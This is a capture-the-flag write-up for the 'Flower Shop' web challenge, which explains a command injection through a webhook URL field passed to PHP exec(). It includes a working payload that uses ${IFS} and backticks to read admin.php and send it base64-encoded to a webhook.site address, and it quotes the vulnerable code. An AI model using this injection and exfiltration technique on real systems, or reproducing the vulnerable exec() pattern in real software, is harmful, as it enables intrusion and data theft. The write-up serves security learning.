# Flower Shop

## Description

Flowers!

*Flag format: CACI{}*

*Author: CACI | @nihilistpenguin*

## Files

* [FlowerShop.zip](files/FlowerShop.zip)


## Solution

For this challenge we are given a website that has a simple registration, login, and password reset function.

![site](images/1.png)

The interesting thing about the registration page is that it has a space to give a webhook address. When a user submits a password reset request, it creates a new temporary password and sends it via a POST request to the provided URL.

We are also given the source code of the website and can explore how the webhook functionality works and how we can potentially abuse it.

First, we can see that the flag will be located in admin.php

```php
<?php include "templates/header.php"; ?>    
    <div class="container">
        <h3>CACI{FAKE_FLAG_FOR_TESTING}</h3>
    </div>
<?php include "templates/footer.php"; ?>
```

In */app/classes/signup.class.php* we can see that the webhook URL is filtered using the built-in filter_var function and FILTER_SANITIZE_URL which removes invalid URL characters.

```php
public function __construct($uid, $pwd, $wh) {
        $this->uid = htmlspecialchars($uid);
        $this->pwd = $pwd;
        $this->wh = filter_var($wh, FILTER_SANITIZE_URL);
    }
```

Then, in */app/classes/reset.class.php* the webhook is used in an exec call, which is vulnerable to command injection.

```php
exec("php ../scripts/send_pass.php " . $this->tmpPass . " " . $this->wh . " > /dev/null 2>&1 &");
```

Since the filtering is fairly lenient, the only thing we really need to worry about is the lack of spaces allowed in our commands. However, we can get around that by using ${IFS} as a seperator instead.

By using webhook.site to create a new temporary webhook we can register a new user on the site with a malicious webhook like:

*webhook.site/<some-id>?data=\`cat${IFS}../admin.php|base64\`*

And then when the password reset is triggered for the user, it reads admin.php and converts it to base64, which is then appended as a parameter to the webhook URL, where we can get the flag.

Since the webroot of the challenge was writable, I chose to simply copy admin.php to a new text file and browse to it.
